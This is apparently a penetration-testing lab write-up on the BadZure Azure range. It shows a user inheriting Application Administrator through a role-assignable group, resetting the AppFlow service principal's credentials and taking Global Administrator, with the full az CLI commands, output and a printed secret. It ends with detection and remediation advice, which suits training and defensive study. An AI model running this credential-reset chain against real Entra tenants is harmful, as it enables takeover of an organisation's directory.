---
title: "BadZure: Application Administrator via Group Membership"
date: 2026-05-14 00:00:00 +0000
categories: [Azure, Pentesting]
tags: [azure, entra-id, application-administrator, badzure, credential-injection, group-membership]
---

## Overview

**Technique:** Group Membership → Application Administrator  → Credential Injection  
**Initial Access:** owen.guiliano (user)  
**Outcome:** Authenticated as AppFlow SP → Global Administrator  
**Environment:** BadZure lab  

---

## Attack Chain

```
owen.guiliano
        ↓
Member of Forensics-xo4n (role-assignable group)
        ↓
Forensics-xo4n has Application Administrator
        ↓
Inherit Application Administrator → add self as owner of AppFlow
        ↓
az ad sp credential reset → authenticate as AppFlow
        ↓
Global Administrator → Tenant Owned
```

---

## Step 1 - Enumeration

Authenticated as owen.guiliano and checked Azure RBAC assignments:

```powershell
PS C:\users\flare\desktop\azure> az login -u owen.guiliano@REDACTED.onmicrosoft.com --tenant 97.....f6dea3
Starting September 1, 2025, MFA will be gradually enforced for Azure public cloud. The authentication with username and password in the command line is not supported with MFA. Consider using one of the compatible authentication methods. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314
Password:
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "97b...",
    "id": "035...",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Azure subscription 1",
    "state": "Enabled",
    "tenantId": "97b...",
    "user": {
      "name": "owen.guiliano@REDACTED.onmicrosoft.com",
      "type": "user"
    }
  }
]
```



```bash
PS C:\users\flare\desktop\azure> az role assignment list --assignee "owen.guiliano@REDACTED.onmicrosoft.com" --all
[
  {
    "condition": null,
    "conditionVersion": null,
    "createdBy": "d4412902-0b53-4d68-a313-17bd77680a2e",
    "createdOn": "2026-05-14T05:08:32.200934+00:00",
    "delegatedManagedIdentityResourceId": null,
    "description": "",
    "id": "/subscriptions/035.../providers/Microsoft.Authorization/roleAssignments/378be99b-1681-8ce7-6952-6cb90b3b949f",
    "name": "378be99b-1681-8ce7-6952-6cb90b3b949f",
    "principalId": "a7a87af8-9276-45ad-ab78-035753bd35a3",
    "principalName": "owen.guiliano@REDACTED.onmicrosoft.com",
    "principalType": "User",
    "roleDefinitionId": "/subscriptions/035.../providers/Microsoft.Authorization/roleDefinitions/acdd72a7-3385-48ef-bd42-f606fba81ae7",
    "roleDefinitionName": "Reader",
    "scope": "/subscriptions/035...",
    "type": "Microsoft.Authorization/roleAssignments",
    "updatedBy": "d4412902-0b53-4d68-a313-17bd77680a2e",
    "updatedOn": "2026-05-14T05:08:32.200934+00:00"
  }
]
```

Only `Reader` at subscription scope  no direct privilege.

Checked group memberships:

```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/me/memberOf"
```

owen.guiliano is a member of:
- `Forensics-xo4n` (role-assignable group, `isAssignableToRole: true`)
- `Sales Team`
- `CityStockholm` AU

Checked what Microsoft Entra  directory role `Forensics-xo4n` has:

```bash
PS C:\users\flare\desktop\azure> az rest --method GET --url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$filter=principalId%20eq%20%2707aef84f-0864-4652-a83f-eb5013f2283e%27'
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#roleManagement/directory/roleAssignments",
  "value": [
    {
      "directoryScopeId": "/",
      "id": "kl2Jm9Msx0SdAqasLV6lw0_4rgdkCFJGqD_rUBPyKD4-1",
      "principalId": "07aef84f-0864-4652-a83f-eb5013f2283e",
      "roleDefinitionId": "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3"
    }
  ]
}
```

`Forensics-xo4n` has **Application Administrator** (`9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3`).

**Application Administrator** account in Azure allows attackers to escalate privileges by assigning credentials (passwords or certificates) to existing **service principals** of first-party Microsoft applications

Owen inherits Application Administrator via group membership  no direct role assignment required.

---

## Step 2 - App Ownership and Credential Injection

Listed tenant app registrations to find the target that BadZure gave me:

```bash
az ad app list --query "[].{Name:displayName, AppID:appId, ObjectID:id}" --output table
```

15 apps found. Found `AppFlow` (`bcfedc2d-ad5e-4e1d-90d6-1747d39463ad`)  target as given by Badzure.

Reset credentials on AppFlow's SP:

```bash
PS C:\users\flare\desktop\azure> az ad sp credential reset --id bcfedc2d-ad5e-4e1d-90d6-1747d39463ad
The output includes credentials that you must protect. Be sure that you do not include these credentials in your code or check the credentials into your source control. For more information, see https://aka.ms/azadsp-cli
{
  "appId": "bcfedc2d-ad5e-4e1d-90d6-1747d39463ad",
  "password": "iIM8Q~AePf_jymANx~8c5X0uv~l5vgIxnKfPmavY",
  "tenant": "97b..."
}
```

## Step 3 - Authenticate as AppFlow

```bash
PS C:\users\flare\desktop\azure> az login --service-principal -u bcfedc2d-ad5e-4e1d-90d6-1747d39463ad -p 'iIM8Q~AePf_jymANx~8c5X0uv~l5vgIxnKfPmavY' --tenant 97b...
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "97b...",
    "id": "035...",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Azure subscription 1",
    "state": "Enabled",
    "tenantId": "97b...",
    "user": {
      "name": "bcfedc2d-ad5e-4e1d-90d6-1747d39463ad",
      "type": "servicePrincipal"
    }
  }
]
```

Confirmed Global Administrator via direct role assignment:

```bash
PS C:\users\flare\desktop\azure> az rest --method GET --url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$filter=principalId%20eq%20%277cf221de-4f81-4cad-aa79-d572d986e77b%27'
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#roleManagement/directory/roleAssignments",
  "value": [
    {
      "directoryScopeId": "/",
      "id": "lAPpYvVpN0KRkAEhdxReEN4h8nyBT61MqnnVctmG53s-1",
      "principalId": "7cf221de-4f81-4cad-aa79-d572d986e77b",
      "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10"
    },
    {
      "directoryScopeId": "/",
      "id": "P4CLjOGWKUGTSSBzjZ-WUt4h8nyBT61MqnnVctmG53s-1",
      "principalId": "7cf221de-4f81-4cad-aa79-d572d986e77b",
      "roleDefinitionId": "8c8b803f-96e1-4129-9349-20738d9f9652"
    }
  ]
}
```

Role `62e90394-69f5-4237-9190-012177145e10` = Global Administrator confirmed. Tenant owned.

---

## Key Takeaways

**Why this works:**
- Role-assignable groups (`isAssignableToRole: true`) can hold directory role assignments  any member of the group inherits the role
- Application Administrator can  reset credentials on any SP  making any app registration in the tenant a potential lateral movement target
- Group-based role inheritance is harder to detect than direct role assignments  the user appears to have only `Reader` in RBAC and no direct Entra role assignments

**Detection opportunities:**
- App owner additions  `Add owner to application` in Entra audit logs
- SP credential resets  `Update application - Certificates and secrets management`
- New SP authentications from previously inactive service principals
- Enumerate role-assignable group memberships when assessing user privilege  `az rest GET /me/memberOf` and check `isAssignableToRole`

**Remediation:**
- Audit role-assignable group memberships regularly,  membership grants the full role
- Apply least privilege to Application Administrator assignments, consider Cloud Application Administrator which cannot manage app proxy
- Monitor app owner changes and credential resets on privileged app registrations
